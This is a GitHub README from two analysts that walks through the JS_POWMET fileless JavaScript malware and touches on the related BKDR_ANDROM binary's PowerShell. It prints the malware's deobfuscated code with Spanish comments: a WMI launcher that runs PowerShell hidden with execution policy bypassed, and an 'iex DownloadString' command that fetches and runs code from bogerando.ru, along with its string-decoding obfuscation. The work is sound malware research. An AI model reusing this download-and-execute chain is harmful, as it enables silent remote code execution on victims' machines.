# JS_POWMET
JS_POWMET Malware Analysis, Javascript, Analysis descriptions and more... =)

This repo will contain an analysis of JS_POWMET some files will be uploaded to this repo that will contain "malicious code".

You can get an analysis from trendmicro in the next url: http://blog.trendmicro.com/trendlabs-security-intelligence/look-js_powmet-completely-fileless-malware/


Now We will explain the analysis phases:

## Javascript JS_POWMET

First, we checked the xml file with embedded javascript (wscript) code, and we could see that everything was obfuscated on a line with different encodings.
So in a great effort and line by line, we started to study program's logic, and get the functionality of each method.


## How javascript malware works

<strong>We changed some code for its string equivalent, if you want to see the equivalent check code comments</strong>

First thing malware does, it is to rotate the variable array_cifrado_Antes_llamado_0xa994 (you have the output from this function in the variable array_cifrado_movido). 

Normal Array:
```javascript
var array_cifrado_Antes_llamado_0xa994 = [" /p1'))", 'winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2', 'Get', 'Win32_ProcessStartup', 'SpawnInstance_', 'ShowWindow', 'winmgmts:root\cimv2:Win32_Process', 'Create', '%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe', 'FileExists', 'ExpandEnvironmentStrings', '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe', 'toPrecision', 'https://bogerando.ru', 'WScript.Shell', "Scripting.FileSystemObject", " -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('"];
```

Array rotated:
```javascript
var array_cifrado_movido = ['winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2', 'Get', 'Win32_ProcessStartup', 'SpawnInstance_', 'ShowWindow', 'winmgmts:root\cimv2:Win32_Process', 'Create', '%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe', 'FileExists', 'ExpandEnvironmentStrings', '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe', 'toPrecision', 'https://bogerando.ru', 'WScript.Shell', "Scripting.FileSystemObject", " -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('"," /p1'))"];
```

Function to rotate array:
```javascript
 (function(array_cifrado_parametro, var_0x155) 
 {
	/*
	* gira 250 veces el array
	*/
	    var remueve_array = function(var_contador) {
		while (--var_contador) {
					// '\x70\x75\x73\x68' = push 
					// '\x73\x68\x69\x66\x74' = shift 

		    array_cifrado_parametro['push'](array_cifrado_parametro['shift']());
		}
	    };
	    remueve_array(++var_0x155);
        }(array_cifrado_Antes_llamado_0xa994, 0x155));
```

At the same time, It creates some variables:
```javascript
var wshel, fso, url, fpath, fextension, showexec, pspath;
```

Malware will use these variables in this code, this code will run the method abc_bbb if user has Powershell installed: 
```javascript
try {
var i = 0x258;
	// extraerString_AntesLlamado_0x4a99('0xb') = "toPrecision"
	alert(i["toPrecision"](0x1f40));
} catch (_0x356210) {
try {
	// extraerString_AntesLlamado_0x4a99('0xc') = "https://bogerando.ru"
    	url = "https://bogerando.ru";
    	showexec = 0x0;
	// extraerString_AntesLlamado_0x4a99('0xd') = "WScript.Shell"
   	 wshel = new ActiveXObject("WScript.Shell");
	//extraerString_AntesLlamado_0x4a99('0xe') = "Scripting.FileSystemObject"
    	fso = new ActiveXObject("Scripting.FileSystemObject");
    	if (is_ps_installed()) {
		// extraerString_AntesLlamado_0x4a99('0xf') = " -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('"
		// extraerString_AntesLlamado_0x4a99('0x10') = " /p1'))"
		abc_bbb(pspath + " -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('" + url + " /p1'))", showexec);
    }
} catch (_0x243c33) {}
```
Here is the powershell check code:
```javascript
function is_ps_installed() {
/*
* Función para obtener la ruta hacia powershell
*/
	//\x45\x78\x70\x61\x6e\x64\x45\x6e\x76\x69\x72\x6f\x6e\x6d\x65\x6e\x74\x53\x74\x72\x69\x6e\x67\x73 = ExpandEnvironmentStrings
	pspath = wshel['ExpandEnvironmentStrings']("%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"); // extraerString_AntesLlamado_0x4a99('0x7') =  "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
	// extraerString_AntesLlamado_0x4a99('0x8') = "FileExists"
	if (fso["FileExists"](pspath)) {
	    return pspath;
	} else {
		// extraerString_AntesLlamado_0x4a99('0x9') = "ExpandEnvironmentStrings"
		// extraerString_AntesLlamado_0x4a99('0xa') = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
	    pspath = wshel["ExpandEnvironmentStrings"]("%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe");
	    if (fso["FileExists"](pspath)) {
		return pspath;
	    }
	}
	return null;
}
```
Finally the abc_bbb code, will create some winmgmts objects to run powershell with a hidden console, this powershell command will download and run powershell code. Here is the abc_bbb function:
```javascript
function abc_bbb(_0xe83a79, showexec_0x52b22a) {
/*
* abc_bbb Ejecuta metodos winmgmts sin mostrar nada 
* 
* showexec_0x52b22a = 0x0 (No mostrar consola)
*/
try {
	    var _0x32ce2c = GetObject("winmgmts:{impersonationLevel=impersonate}!\.ootcimv2"); //  extraerString_AntesLlamado_0x4a99('0x0') = "winmgmts:{impersonationLevel=impersonate}!\.ootcimv2"
	    var _0x6b4dc5 = _0x32ce2c["Get"]("Win32_ProcessStartup"); // extraerString_AntesLlamado_0x4a99('0x1') = "Get" , extraerString_AntesLlamado_0x4a99('0x2') = "Win32_ProcessStartup"
	    var Object_config_0xa44dcc = _0x6b4dc5["SpawnInstance_"](); // extraerString_AntesLlamado_0x4a99('0x3') = "SpawnInstance_"
	    Object_config_0xa44dcc["ShowWindow"] = showexec_0x52b22a; // extraerString_AntesLlamado_0x4a99('0x4') = "ShowWindow"
	    var _0x180dea = GetObject("winmgmts:rootcimv2:Win32_Process"); // extraerString_AntesLlamado_0x4a99('0x5') = "winmgmts:rootcimv2:Win32_Process"
	    var Process_ID_0x321dea; // aqui guardara el PID del proceso
	    return _0x180dea["Create"](_0xe83a79, null, Object_config_0xa44dcc, Process_ID_0x321dea); // extraerString_AntesLlamado_0x4a99('0x6') = "Create"
	} catch (_0x352a82) {}
	// ![] = false
	return false;
}
```
Last function is an interesting function to decode each line from first array, instead of using normal javascript functions to decode the line, it will decode character by character.
```javascript
var extraerString_AntesLlamado_0x4a99 = function(valor_entero_Antes_llamado_0x38fb4f, no_vale_para_nada) 
{
    valor_entero_Antes_llamado_0x38fb4f = valor_entero_Antes_llamado_0x38fb4f - 0x0;
    var linea_array_cifrado = array_cifrado_Antes_llamado_0xa994[valor_entero_Antes_llamado_0x38fb4f];
	//\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64 = initialized
    if (extraerString_AntesLlamado_0x4a99['initialized'] === undefined) {
        (function() {
			/*
			* Función para decodificar cada linea de base64 letra a letra 
			* intenta ofuscar el método de decodificación.
			*/
			//\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x28\x29\x20 = return (function () 
			//\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28\x29 = {}.constructor("return this")()
			//\x29\x3b = );
            var _0x4df2e5 = Function('return (function ()' + '{}.constructor("return this")()' + ');');
            var _0x38fe1b = _0x4df2e5(); // retorna función anonima
			//'\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d' =  ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
            var _0x1dc063 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
			//\x61\x74\x6f\x62 =  atob (decodifica una cadena en base64)
            _0x38fe1b['atob'] || (_0x38fe1b['atob'] = function(_0x3e2949) {
				// \x72\x65\x70\x6c\x61\x63\x65 = replace
				/* 
				* var _0x3644f3 = String(_0x3e2949)['replace'](/=+$/, ''); 
				* Creemos  que esta función reemplaza todos los iguales de final de linea por nada
				*/
                var _0x3644f3 = String(_0x3e2949)['replace'](/=+$/, '');
				//\x63\x68\x61\x72\x41\x74 = charAt
				//\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65 = fromCharCodefromCharCode
				//\x69\x6e\x64\x65\x78\x4f\x66 = indexOf
                for (var i = 0x0, j, l, k = 0x0, m = ''; //inicializacion
				l = _0x3644f3['charAt'](k++); //finalizacion
				~l && (j = i % 0x4 ? j * 0x40 + l : l, i++ % 0x4) ? m += String['fromCharCodefromCharCode'](0xff & j >> (-0x2 * i & 0x6)) : 0x0) //modificacion
				{
                    l = _0x1dc063['indexOf'](l);
                }
                return m;
            });
        }());
        //\x62\x61\x73\x65\x36\x34\x44\x65\x63\x6f\x64\x65\x55\x6e\x69\x63\x6f\x64\x65 =  base64DecodeUnicode
		extraerString_AntesLlamado_0x4a99['base64DecodeUnicode'] = function(_0x12e606) {
			/*
			* Codificador a hexadecimal de las cadenas
			* finalmente lo decodifica como URIs
			*/
            var base64_decodificado = atob(_0x12e606);
            var _0x29e7ff = [];
			//\x6c\x65\x6e\x67\x74\x68 = length
            for (var i = 0x0, j = base64_decodificado['length']; i < j; i++) {
				// \x25 %
				// \x30 0 
				// \x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74 = charCodeAt
				// \x74\x6f\x53\x74\x72\x69\x6e\x67 = toString
				// \x73\x6c\x69\x63\x65 = slice
                _0x29e7ff += '%' + ('00' + base64_decodificado['charCodeAt'](i)['toString'](16))['slice'](-0x2);
            }
            return decodeURIComponent(_0x29e7ff);
        };
		// \x64\x61\x74\x61 = data
        extraerString_AntesLlamado_0x4a99['data'] = {};
		//\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64 = initialized
		// inicializa a true 
		// !![] = true
        extraerString_AntesLlamado_0x4a99['initialized'] = true;
    }
    if (extraerString_AntesLlamado_0x4a99['data'][valor_entero_Antes_llamado_0x38fb4f] === undefined) {
		//\x62\x61\x73\x65\x36\x34\x44\x65\x63\x6f\x64\x65\x55\x6e\x69\x63\x6f\x64\x65 = base64DecodeUnicode
        linea_array_cifrado = extraerString_AntesLlamado_0x4a99['base64DecodeUnicode'](linea_array_cifrado);
        extraerString_AntesLlamado_0x4a99['data'][valor_entero_Antes_llamado_0x38fb4f] = linea_array_cifrado;
    } else {
        linea_array_cifrado = extraerString_AntesLlamado_0x4a99['data'][valor_entero_Antes_llamado_0x38fb4f];
    }
    return linea_array_cifrado;
};
```


You can check the obfuscated code in: <a href="https://github.com/Fare9/JS_POWMET/blob/master/JS_POWMET.DE.xml">JS_POWMET.DE.xml</a>

The deobfuscated code in: <a href="https://github.com/Fare9/JS_POWMET/blob/master/JS_POWMET.DE(desofuscado).xml.js">JS_POWMET.DE(deobfuscated).xml</a>

And the Strings: <a href="https://github.com/Fare9/JS_POWMET/blob/master/CadenasCodificadasDescodificadas">Strings</a>

## Binary Analysis

After the javascript analysis, we toke our IDA Pro to analyze the binary known as BKDR_ANDROM which run the final payload.

First of all, we started looking for strings inside IDA Pro strings view, .data, .rdata... And we saw some strings which were part of powershell code, so we took notepad++ and started analysis and cleaning code process. We have some generic variables like these:

```powershell
$reg_keyname = 'reg_key_placeholder';
$dllname64 = 'dll64_regValueName_placeholder';
$dllname32 = 'dll32_regValueName_placeholder';
```

So these variables should be set dynamically in program execution (and resolve our doubs about this powershell). One interesting line of code was:

```powershell
$pscript = $pscript + 'Invoke-ReflectivePEInjection -PEBytes $dllbytes;'
```

With this line, the script can inject executable code in memory instead of write to file and then execute the file. (You can find an analysis of a powershell like this in this URL: https://isc.sans.edu/forums/diary/Powershell+Malware+No+Hard+drive+Just+hard+times/20823/ ).

Now should start the static code analysis searching interesting code...

## Analysts

- <a href="https://es.linkedin.com/in/aperezreyes">Alberto Pérez Reyes</a>
- <a href="https://www.linkedin.com/in/eduardo-blazquez-23093999/">Eduardo Blázquez (a.k.a Fare9)</a>


## Remember visit and follow

- <a href="https://github.com/Fare9">https://github.com/Fare9</a>
- <a href="https://github.com/campeador">https://github.com/campeador</a>
- <a href="https://twitter.com/Erockandblues">Fare9 Twitter</a>
